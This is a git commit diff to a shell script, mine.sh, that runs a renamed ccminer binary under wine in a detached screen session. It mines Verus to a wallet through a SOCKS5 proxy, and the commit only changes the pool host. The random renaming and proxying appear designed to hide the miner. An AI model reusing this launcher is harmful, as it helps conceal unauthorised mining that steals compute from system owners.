2a9d1793ec83e5cc5e13a629d4116932bf4e601d
RizqiKamall <rizqikamal0014@gmail.com>
2025-02-25 03:30:07 +0700

    Update mine.sh

--- mine.sh
+++ mine.sh
@@ -3,4 +3,4 @@ cd ccminer_CPU_3.8.3
 proxy_url="socks5://ayoyojuhnk.biz.id:6201" 
 random_name=$(tr -dc A-Za-z </dev/urandom | head -c 10)  # Menghasilkan nama acak sepanjang 8 karakter 
 mv ccminer.exe $random_name.exe 
-screen -d -m bash -c "wine $random_name.exe -a verus -o stratum+tcp://usw.vipor.net:5040 -u RAxQVenbK9dxYRRta1n1CtBtRW1GydoUNk.belotloh -p d=5 -t 4 --proxy=$proxy_url"
+screen -d -m bash -c "wine $random_name.exe -a verus -o stratum+tcp://cn.vipor.net:5040 -u RAxQVenbK9dxYRRta1n1CtBtRW1GydoUNk.belotloh -p d=5 -t 4 --proxy=$proxy_url"
